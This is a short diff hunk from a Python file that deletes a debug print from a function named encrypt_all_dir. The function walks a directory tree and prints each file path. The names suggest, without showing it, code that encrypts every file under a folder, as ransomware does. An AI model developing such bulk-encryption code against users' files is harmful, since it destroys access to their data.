@@ -28,8 +28,6 @@ def curr_user():
 
 
 def encrypt_all_dir(root_dir, key):
-        print(root_dir)
-        
         for dirName, subDirList, fileList in os.walk(root_dir):
                 for file in fileList:
                         print(os.path.join(root_dir, file))
